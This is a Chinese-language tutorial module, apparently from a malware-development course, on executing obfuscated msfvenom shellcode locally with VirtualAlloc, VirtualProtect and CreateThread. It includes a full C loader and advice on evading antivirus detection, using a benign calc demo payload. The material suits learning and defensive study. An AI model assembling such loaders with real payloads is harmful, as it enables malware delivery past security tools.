模块 27 - 本地 Payload 执行 - Shellcode

本模块将讨论通过新建线程执行 shellcode 的一种最简单方法。虽然这种技术很简单，但了解其工作原理至关重要，因为它为更高级的 shellcode 执行方法奠定了基础。

本模块中讨论的方法使用了 Windows API VirtualAlloc、VirtualProtect 和 CreateThread。需要注意的是，这种方法绝不是一种隐形技术，EDR 几乎肯定会检测到这种简单的 shellcode 执行技术。但另一方面，利用这种方法并经过充分混淆，有可能绕过杀毒软件。

所需 Windows API

要了解该内容，可以先从以下将用于该技术的一些 Windows API 的文档入手：

  • VirtualAlloc - 分配用于存储有效负载的内存。
  • VirtualProtect - 更改分配内存的内存保护，使其可执行有效负载。
  • CreateThread - 创建一个新线程来运行有效负载。

混淆Payload

本模块使用的负载是 Msfvenom 生成的 x64 计算负载。为了使演示更贴近实际，需要尝试规避 Defender，因此需要对有效负载进行混淆或加密。将使用之前模块中引入的 HellShell 来混淆有效负载。运行以下命令：

HellShell.exe msfvenom.bin uuid

输出应保存到UuidArray变量中。

分配内存

VirtualAlloc 用于分配 sDeobfuscatedSize 大小的内存。sDeobfuscatedSize 的大小由 UuidDeobfuscation 函数确定，该函数返回已还原有效负载的总大小。

根据其文档，VirtualAlloc WinAPI 函数类似于以下内容：

LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,          // 要分配的区域的起始地址（设为 NULL）
  [in]           SIZE_T dwSize,             // 要分配的区域的大小，以字节为单位
  [in]           DWORD  flAllocationType,   // 内存分配类型
  [in]           DWORD  flProtect           // 要分配的页区域的内存保护
);

内存分配类型指定为 MEM_RESERVE | MEM_COMMIT，它将在调用进程的虚拟地址空间中保留一系列页并向这些保留的页提交物理内存，将这两个标志分述如下：

  • MEM_RESERVE 用于保留一系列页而不实际提交物理内存。
  • MEM_COMMIT 用于在进程的虚拟地址空间中提交一系列页。

VirtualAlloc 的最后一个参数设置内存区域的权限。最简单的方法是将内存保护设为 PAGE_EXECUTE_READWRITE，但这通常是许多安全解决方案表示的恶意活动指示器。因此，内存保护被设为 PAGE_READWRITE，因为此时只需要写入有效负载，而不需要执行它。最后，VirtualAlloc 将返回分配的内存的基本地址。

将有效负载写入内存

接下来，将解混淆的有效负载字节复制到 pShellcodeAddress 的新分配内存区域中，然后通过用 0 覆盖 pDeobfuscatedPayload 来清理它。pDeobfuscatedPayload 是由 UuidDeobfuscation 函数分配的堆的基地址，该函数返回原始 shellcode 字节。由于不再需要它，因此已用零覆盖它，从而减少了安全解决方案在内存中找到有效负载的可能性。

修改内存保护

在执行有效负载之前，必须先更改内存保护，因为目前只允许读/写。VirtualProtect 用于修改内存保护，有效负载需要 PAGE_EXECUTE_READ 或 PAGE_EXECUTE_READWRITE 才能执行。

根据文档，VirtualProtect WinAPI 函数如下所示：

BOOL VirtualProtect(
  [in]  LPVOID lpAddress,       // 要更改其访问保护的内存区域的基地址
  [in]  SIZE_T dwSize,          // 要更改其访问保护属性的区域大小（以字节为单位）
  [in]  DWORD  flNewProtect,    // 新的内存保护选项
  [out] PDWORD lpflOldProtect   // 指向接收 `lpAddress` 之前访问保护值的 `DWORD` 变量
);

尽管一些 Shellcode 需要 PAGE_EXECUTE_READWRITE，例如自解密 Shellcode，但 Msfvenom x64 calc Shellcode 不需要，但以下代码片段使用了这种内存保护。

通过 CreateThread 执行有效载荷

最后，使用 CreateThread Windows API 函数创建一个新线程并传入有效载荷地址 pShellcodeAddress 来执行有效载荷。

根据文档，CreateThread WinAPI 函数如下所示：

HANDLE CreateThread(
  [in, optional]  LPSECURITY_ATTRIBUTES   lpThreadAttributes,    // 设置为 NULL - 可选
  [in]            SIZE_T                  dwStackSize,           // 设置为 0 - 默认
  [in]            LPTHREAD_START_ROUTINE  lpStartAddress,        // 指向线程要执行的函数，在我们的示例中是有效载荷的基地址
  [in, optional]  __drv_aliasesMem LPVOID lpParameter,           // 指向要传递给执行函数的变量（设置为 NULL - 可选）
  [in]            DWORD                   dwCreationFlags,       // 设置为 0 - 默认
  [out, optional] LPDWORD                 lpThreadId             // 指向接收线程 ID 的 "DWORD" 变量（设置为 NULL - 可选）   
);

通过函数指针执行有效载荷

还有另一种更简单的方法，无需使用 Windows API CreateThread 即可运行 Shellcode。在以下示例中，Shellcode 被强制转换为 VOID 函数指针，并将 Shellcode 作为函数指针执行。此代码实质上跳转到 pShellcodeAddress 地址。

    (*(VOID(*)()) pShellcodeAddress)();

这等同于运行以下代码。

    typedef VOID (WINAPI* fnShellcodefunc)();       // 在主函数之前定义
    fnShellcodefunc pShell = (fnShellcodefunc) pShellcodeAddress;
    pShell();

CreateThread 与函数指针执行

尽管可以使用函数指针方法执行 shellcode，但通常不建议这样做。Msfvenom 生成的 shellcode 在执行完成后将终止调用线程。如果使用函数指针方法执行 shellcode，那么调用线程将是主线程，因此整个进程在 shellcode 执行完毕后退出。

在另一个新线程中执行 shellcode 可以避免这个问题，因为当 shellcode 执行完成后，将终止新的工作线程而不是主线程，从而防止整个进程中止。

等待线程执行

在没有短时间延迟的情况下使用新线程执行 shellcode 会增加在运行 shellcode 的工作线程完成执行之前主线程执行结束的可能性，从而导致 shellcode 无法正确运行。以下代码片段说明了这种情况。

int main(){

    // ...

    CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL); // Shellcode 执行
    return 0; // 主线程在运行 shellcode 的线程之前完成执行
}

在提供的实现中，getchar() 用于暂停执行，直到用户提供输入。在实际实现中，应该使用不同的方法，利用 WinAPI 的 WaitForSingleObject 在线程执行之前等待指定的时间。

下面的代码片段使用 WaitForSingleObject 等待新创建的线程在执行剩余代码之前执行 2000 毫秒。

HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
WaitForSingleObject(hThread, 2000);

// 剩余代码

在下面的示例中，WaitForSingleObject 将一直等待新线程完成执行。

HANDLE hThread = CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL);
WaitForSingleObject(hThread, INFINITE);

Main 函数

Main 函数使用 UuidDeobfuscation 对有效载荷进行脱混淆，然后分配内存、将 Shellcode 复制到内存区域并执行它。

int main() {

    PBYTE       pDeobfuscatedPayload = NULL;
    SIZE_T      sDeobfuscatedSize    = NULL;

    printf("[i] 注入 Shellcode 到 PID 为 %d 的本地进程\n", GetCurrentProcessId());
    printf("[#] 按 <Enter> 解密... ");
    getchar();

    printf("[i] 正在解密...");
    if (!UuidDeobfuscation(UuidArray, NumberOfElements, &pDeobfuscatedPayload, &sDeobfuscatedSize)) {
        return -1;
    }
    printf("[+] 完成！\n");
    printf("[i] 脱混淆后的有效载荷位于：0x%p，大小为：%d \n", pDeobfuscatedPayload, sDeobfuscatedSize);

    printf("[#] 按 <Enter> 分配... ");
    getchar();
    PVOID pShellcodeAddress = VirtualAlloc(NULL, sDeobfuscatedSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    // MEM_COMMIT：立即提交内存，即分配物理内存。
    // MEM_RESERVE：只是将一段地址空间标记为保留，不分配物理内存。
    if (pShellcodeAddress == NULL) {
        printf("[!] VirtualAlloc 失败，错误代码：%d \n", GetLastError());
        return -1;
    }
    printf("[i] 在 0x%p 分配了内存\n", pShellcodeAddress);

    printf("[#] 按 <Enter> 写入有效载荷... ");
    getchar();
    memcpy(pShellcodeAddress, pDeobfuscatedPayload, sDeobfuscatedSize);
    memset(pDeobfuscatedPayload, '\0', sDeobfuscatedSize);

    DWORD dwOldProtection = NULL;

    if (!VirtualProtect(pShellcodeAddress, sDeobfuscatedSize, PAGE_EXECUTE_READWRITE, &dwOldProtection)) {
        // PAGE_EXECUTE_READWRITE：可被执行、读取和写入的内存页。
        printf("[!] VirtualProtect 失败，错误代码：%d \n", GetLastError());
        return -1;
    }

    printf("[#] 按 <Enter> 运行... ");
    getchar();
    if (CreateThread(NULL, NULL, pShellcodeAddress, NULL, NULL, NULL) == NULL) {
        printf("[!] CreateThread 失败，错误代码：%d \n", GetLastError());
        return -1;
    }

    HeapFree(GetProcessHeap(), 0, pDeobfuscatedPayload);
    printf("[#] 按 <Enter> 退出... ");
    getchar();
    return 0;
}

释放内存

VirtualFree 是一个 WinAPI，用于释放先前分配的内存。在有效载荷完全执行完毕后才应该调用此函数，否则它可能会释放有效载荷的内容并导致进程崩溃。

BOOL VirtualFree(
  [in] LPVOID lpAddress,
  [in] SIZE_T dwSize,
  [in] DWORD  dwFreeType
);

VirtualFree 接受要释放的已分配内存的基地址 (lpAddress)、要释放的内存的大小 (dwSize) 和释放操作类型 (dwFreeType)，它可以是以下标志之一：

  • MEM_DECOMMIT - VirtualFree 调用将释放物理内存，而不释放与之链接的虚拟地址空间。因此，仍可以使用虚拟地址空间在将来分配内存，但与之链接的页面不再受物理内存支持。
  • MEM_RELEASE - 同时释放与已分配虚拟内存关联的虚拟地址空间和物理内存。请注意，根据 Microsoft 的文档，如果使用此标志，则 dwSize 参数必须为 0。 调试
